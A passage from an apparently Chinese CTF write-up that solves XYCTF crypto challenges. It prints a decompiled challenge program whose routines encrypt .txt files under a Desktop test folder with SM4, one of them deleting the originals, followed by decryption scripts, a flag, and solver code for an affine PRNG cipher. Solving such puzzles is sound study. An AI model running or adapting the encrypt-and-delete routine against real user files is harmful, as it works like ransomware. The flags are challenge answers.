class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randrange</span><br><span class="line"></span><br><span class="line">N = <span class="number">49</span> </span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">128</span>  </span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q &gt; (<span class="number">6</span> * d + <span class="number">1</span>) * p</span><br><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_T</span>(<span class="params">d1, d2</span>):</span><br><span class="line">    <span class="keyword">assert</span> N &gt;= d1 + d2</span><br><span class="line">    s = [<span class="number">1</span>] * d1 + [-<span class="number">1</span>] * d2 + [<span class="number">0</span>] * (N - d1 - d2)</span><br><span class="line">    shuffle(s)</span><br><span class="line">    <span class="keyword">return</span> R(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_prime</span>(<span class="params">f, p</span>):</span><br><span class="line">    Rp = R.change_ring(Integers(p)).quotient(x^N - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> R(lift(<span class="number">1</span> / Rp(f)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convolution</span>(<span class="params">f, g</span>):</span><br><span class="line">    <span class="keyword">return</span> (f * g) % (x^N - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lift_mod</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">return</span> R([((f[i] + q // <span class="number">2</span>) % q) - q // <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_mod</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">return</span> R([f[i] % q <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_mod_pow2</span>(<span class="params">f, q</span>):</span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invert_mod_prime(f, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = lift_mod(convolution(g, f), q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = lift_mod(convolution(g, <span class="number">2</span> - r), q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_message</span>():</span><br><span class="line">    <span class="keyword">return</span> R([randrange(p) - <span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = generate_T(d + <span class="number">1</span>, d)</span><br><span class="line">            g = generate_T(d, d)</span><br><span class="line">            Fp = poly_mod(invert_mod_prime(f, p), p)</span><br><span class="line">            Fq = poly_mod(invert_mod_pow2(f, q), q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    h = poly_mod(convolution(Fq, g), q)</span><br><span class="line">    <span class="keyword">return</span> h, (f, g)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_message</span>(<span class="params">m, h</span>):</span><br><span class="line">    e = lift_mod(p * convolution(h, generate_T(d, d)) + m, q)</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_ntru_keys</span>():</span><br><span class="line">    h, secret = generate_key()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pub_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(h))</span><br><span class="line">    m = generate_message()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;priv_key.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(m))</span><br><span class="line">    e = encrypt_message(m, h)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;enc.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terms</span>(<span class="params">poly_str</span>):</span><br><span class="line">    terms = []</span><br><span class="line">    pattern = <span class="string">r&#x27;([+-]?\s*x\^?\d*|[-+]?\s*\d+)&#x27;</span></span><br><span class="line">    matches = re.finditer(pattern, poly_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        term = <span class="keyword">match</span>.group()</span><br><span class="line">        <span class="keyword">if</span> term == <span class="string">&#x27;+x&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            terms.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> term == <span class="string">&#x27;-x&#x27;</span>:</span><br><span class="line">            terms.append(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x^&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            exponent = <span class="built_in">int</span>(term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                coeff = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                coeff = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                coeff = <span class="built_in">int</span>(coeff_part)</span><br><span class="line">            terms.append(coeff * exponent)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                terms.append(-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                terms.append(<span class="built_in">int</span>(coeff_part))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> term == <span class="string">&#x27;+1&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">0</span>)</span><br><span class="line">                terms.append(-<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> terms</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">poly_terms</span>):</span><br><span class="line">    binary = [<span class="number">0</span>] * <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> poly_terms:</span><br><span class="line">        exponent = <span class="built_in">abs</span>(term)</span><br><span class="line">        <span class="keyword">if</span> term &gt; <span class="number">0</span> <span class="keyword">and</span> exponent &lt;= <span class="number">127</span>:  </span><br><span class="line">            binary[<span class="number">127</span> - exponent] = <span class="number">1</span></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary))</span><br><span class="line">    hex_key = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:].upper().zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_polynomial_from_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">return</span> file.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;SM4 key must be 16 bytes&quot;</span></span><br><span class="line">    cipher = sm4.CryptSM4()</span><br><span class="line">    cipher.set_key(key, sm4.SM4_ENCRYPT)</span><br><span class="line">    padded_plaintext = pad(plaintext, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher.crypt_ecb(padded_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt_file</span>(<span class="params">input_path, output_path, key</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        plaintext = f.read()</span><br><span class="line">    </span><br><span class="line">    ciphertext = sm4_encrypt(key, plaintext)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resource_path</span>(<span class="params">relative_path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">getattr</span>(sys, <span class="string">&#x27;frozen&#x27;</span>, <span class="literal">False</span>):</span><br><span class="line">        base_path = sys._MEIPASS</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        base_path = os.path.abspath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> os.path.join(base_path, relative_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_directory</span>(<span class="params">directory, sm4_key, extensions=[<span class="string">&quot;.txt&quot;</span>]</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(directory):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Directory does not exist: <span class="subst">&#123;directory&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(file.endswith(ext) <span class="keyword">for</span> ext <span class="keyword">in</span> extensions):</span><br><span class="line">                input_path = os.path.join(root, file)</span><br><span class="line">                output_path = input_path + <span class="string">&quot;.enc&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    sm4_encrypt_file(input_path, output_path, sm4_key)</span><br><span class="line">                    os.remove(input_path)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Encrypted: <span class="subst">&#123;input_path&#125;</span> -&gt; <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Error encrypting <span class="subst">&#123;input_path&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        save_ntru_keys()</span><br><span class="line">        poly_str = read_polynomial_from_file(<span class="string">&quot;priv_key.txt&quot;</span>)</span><br><span class="line">        poly_terms = terms(poly_str)</span><br><span class="line">        sm4_key = binascii.unhexlify(poly_terms)</span><br><span class="line">        user_name = os.getlogin()</span><br><span class="line">        target_dir = os.path.join(<span class="string">&quot;C:\Users&quot;</span>, user_name, <span class="string">&quot;Desktop&quot;</span>, <span class="string">&quot;test_files&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">            os.makedirs(target_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Created directory: <span class="subst">&#123;target_dir&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        txt_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(target_dir) </span><br><span class="line">                    <span class="keyword">if</span> f.endswith(<span class="string">&#x27;.txt&#x27;</span>) <span class="keyword">and</span> os.path.isfile(os.path.join(target_dir, f))]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> txt_files:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No .txt files found in directory&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> txt_file <span class="keyword">in</span> txt_files:</span><br><span class="line">            file_path = os.path.join(target_dir, txt_file)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    test_data = f.read()</span><br><span class="line">                </span><br><span class="line">                ciphertext = sm4_encrypt(sm4_key, test_data)</span><br><span class="line">                encrypted_path = file_path + <span class="string">&#x27;.enc&#x27;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(ciphertext)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Error processing <span class="subst">&#123;txt_file&#125;</span>: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Fatal error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>发现将是多项式m转换为SM4密钥加密，p，d&#x3D;3本来应该对enc多项式取模获得m，但是发现反编译出的文件有enc.txt和pub_key.txt，其中enc.txt里有两个多项式，使用第二个居然可以直接解密。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terms</span>(<span class="params">poly_str</span>):</span><br><span class="line">    terms = []</span><br><span class="line">    pattern = <span class="string">r&#x27;([+-]?\s*x\^?\d*|[-+]?\s*\d+)&#x27;</span></span><br><span class="line">    matches = re.finditer(pattern, poly_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        <span class="built_in">print</span>(<span class="keyword">match</span>)</span><br><span class="line">        term = <span class="keyword">match</span>.group()</span><br><span class="line">        <span class="keyword">if</span> term == <span class="string">&#x27;+x&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            terms.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> term == <span class="string">&#x27;-x&#x27;</span>:</span><br><span class="line">            terms.append(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x^&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            exponent = <span class="built_in">int</span>(term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                coeff = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                coeff = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                coeff = <span class="built_in">int</span>(coeff_part)</span><br><span class="line">            terms.append(coeff * exponent)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                terms.append(-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                terms.append(<span class="built_in">int</span>(coeff_part))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> term == <span class="string">&#x27;+1&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">0</span>)</span><br><span class="line">                terms.append(-<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> terms</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_decrypt</span>(<span class="params">key_hex, ciphertext_hex</span>):</span><br><span class="line">    key = binascii.unhexlify(key_hex)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line">    cipher = sm4.CryptSM4()</span><br><span class="line">    cipher.set_key(key, sm4.SM4_DECRYPT)</span><br><span class="line">    ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line">    <span class="built_in">print</span>(ciphertext)</span><br><span class="line">    plaintext = cipher.crypt_ecb(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_encrypt</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">16</span>, <span class="string">&quot;SM4 key must be 16 bytes&quot;</span></span><br><span class="line">    cipher = sm4.CryptSM4()</span><br><span class="line">    cipher.set_key(key, sm4.SM4_ENCRYPT)</span><br><span class="line">    padded_plaintext = pad(plaintext, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher.crypt_ecb(padded_plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=<span class="string">&quot;-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1&quot;</span></span><br><span class="line">m_ = terms(m)</span><br><span class="line"><span class="built_in">print</span>(m_)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">poly_terms</span>):</span><br><span class="line">    binary = [<span class="number">0</span>] * <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> poly_terms:</span><br><span class="line">        exponent = <span class="built_in">abs</span>(term)</span><br><span class="line">        <span class="keyword">if</span> term &gt; <span class="number">0</span> <span class="keyword">and</span> exponent &lt;= <span class="number">127</span>:  </span><br><span class="line">            binary[<span class="number">127</span> - exponent] = <span class="number">1</span></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary))</span><br><span class="line">    hex_key = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:].upper().zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_key</span><br><span class="line"></span><br><span class="line">hex_key = gen_key(m_)</span><br><span class="line"><span class="built_in">print</span>(hex_key)</span><br><span class="line"></span><br><span class="line">encrypted_flag = <span class="string">&quot;bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835&quot;</span></span><br><span class="line">flag = sm4_decrypt(hex_key, encrypted_flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>

<p>XYCTF{Crypto0_can_n0t_So1ve_it}</p>
<h3 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h3><p>题目给出一个基于random的随机数生成器</p>
<p>但是观察密文前两组是一样的，是同一个字符，根据出题人给出的其他参数，推测flag前几位是114514</p>
<p>有两个不一样的m即可两组enc相减乘m差值的逆元获得a，即可获得a，b。解密即可</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import <span class="type">string</span></span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">table = <span class="type">string</span>.ascii_letters + <span class="type">string</span>.digits</span><br><span class="line"></span><br><span class="line">r = random.Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> PRNG:</span><br><span class="line">    def __init__(self, seed):</span><br><span class="line">        self.a = <span class="number">1145140</span></span><br><span class="line">        self.b = <span class="number">19198100</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">    def <span class="keyword">next</span>(self):</span><br><span class="line">        x = random.randint(self.a, self.b)</span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line">    def round(self, k):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(k):</span><br><span class="line">            x = self.<span class="keyword">next</span>()</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">def encrypt(msg, a, b):</span><br><span class="line">    c = [(a * table.index(m) + b) % <span class="number">19198111</span> <span class="keyword">for</span> m <span class="keyword">in</span> msg]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">enc=[<span class="number">10452836</span>, <span class="number">10452836</span>, <span class="number">9474070</span>, <span class="number">15547185</span>, <span class="number">10452836</span>, <span class="number">9474070</span>, <span class="number">6914981</span>, <span class="number">5936215</span>, <span class="number">1042385</span>, <span class="number">841866</span>, <span class="number">13966862</span>, <span class="number">10051798</span>, <span class="number">3978683</span>, <span class="number">5936215</span>, <span class="number">17103679</span>, <span class="number">15146147</span>, <span class="number">5936215</span>, <span class="number">9073032</span>, <span class="number">9073032</span>, <span class="number">3978683</span>, <span class="number">13966862</span>, <span class="number">14945628</span>, <span class="number">17103679</span>, <span class="number">12988096</span>, <span class="number">841866</span>, <span class="number">2999917</span>, <span class="number">3978683</span>, <span class="number">2021151</span>, <span class="number">9073032</span>, <span class="number">10452836</span>, <span class="number">1443423</span>, <span class="number">10452836</span>, <span class="number">1443423</span>, <span class="number">14568419</span>, <span class="number">10452836</span>, <span class="number">4379721</span>]</span><br><span class="line"></span><br><span class="line">prng = 